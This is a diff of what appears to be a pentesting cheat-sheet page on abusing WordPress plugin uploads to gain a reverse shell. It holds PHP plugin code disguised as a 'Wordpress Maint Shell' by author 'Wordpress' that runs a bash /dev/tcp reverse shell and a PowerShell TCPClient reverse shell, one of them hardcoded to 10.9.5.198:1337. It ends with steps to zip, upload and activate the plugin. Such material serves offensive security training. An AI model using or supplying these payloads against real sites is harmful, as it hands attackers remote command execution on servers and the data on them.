@@ -23,7 +23,7 @@ You can abuse the wordpress plugin feature to get a reverse shell if you have ac
  *  Plugin Name: Wordpress Maint Shell
  *  Author: Wordpress
  **/ 
-exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{IP-ADDRESS}/{PORT} 0>&1'\")
+exec("/bin/bash -c 'bash -i >& /dev/tcp/{IP-ADDRESS}/{PORT} 0>&1'")
 ?>
 ```
 
@@ -35,7 +35,7 @@ exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{IP-ADDRESS}/{PORT} 0>&1'\")
  *  Plugin Name: Wordpress Maint Shell
  *  Author: Wordpress
  **/ 
-exec("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP-ADDRESS}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'");
+exec("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.9.5.198',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'");
 ?>
 ```
 Save the above to a file, compress into a `.zip` archive and then upload & activate.
